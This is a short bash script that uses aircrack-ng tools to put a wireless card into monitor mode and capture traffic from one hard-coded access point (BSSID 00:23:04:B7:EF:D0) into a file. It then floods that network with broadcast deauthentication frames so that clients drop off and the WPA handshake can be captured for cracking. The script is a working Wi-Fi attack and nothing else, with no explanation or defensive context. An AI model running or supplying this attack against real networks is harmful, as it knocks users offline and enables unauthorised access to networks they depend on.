#!/bin/bash

airmon-ng check kill > /dev/null 2>&1
airmon-ng start wlan0 > /dev/null 2>&1
airodump-ng wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 15 ; kill -9 $var
airodump-ng -c 1 --bssid 00:23:04:B7:EF:D0 -w Captura wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 15
aireplay-ng -0 15 -a 00:23:04:B7:EF:D0 -c FF:FF:FF:FF:FF:FF wlan0mon
kill -9 $var
airmon-ng stop wlan0mon
systemctl enable NetworkManager
systemctl start NetworkManager

